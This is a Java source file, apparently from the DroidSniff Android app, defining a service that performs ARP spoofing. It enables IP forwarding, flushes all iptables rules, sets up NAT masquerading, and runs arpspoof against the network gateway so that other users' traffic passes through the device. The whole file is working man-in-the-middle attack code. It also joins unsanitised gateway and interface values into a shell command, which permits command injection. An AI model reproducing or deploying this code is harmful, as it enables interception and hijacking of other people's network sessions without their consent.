package com.evozi.droidsniff.controller.service;

import android.content.Intent;
import android.os.Bundle;
import com.evozi.droidsniff.model.Setup;

import java.util.ArrayList;
import java.util.List;

public final class ArpspoofService extends DaemonService {
    @Override
    protected List<String> preCommands(Intent intent) {
        return new ArrayList<String>() {{
            add("chmod 777 " + Setup.get().getBinaryPath("arpspoof"));
            add("echo 1 > /proc/sys/net/ipv4/ip_forward");
            add("iptables -F");
            add("iptables -t nat -I POSTROUTING -s 0/0 -j MASQUERADE");
            add("iptables -P FORWARD ACCEPT");
        }};
    }

    @Override
    protected String command(Intent intent) {
        Bundle bundle = intent.getExtras();
        String gateway = bundle.getString("gateway");
        String wifiInterface = bundle.getString("interface");

        return Setup.get().getBinaryPath("arpspoof") + " -i " + wifiInterface + " " + gateway;
    }

    @Override
    protected List<String> postCommands(Intent intent) {
        return new ArrayList<String>() {{
            add("killall arpspoof");
        }};
    }
}
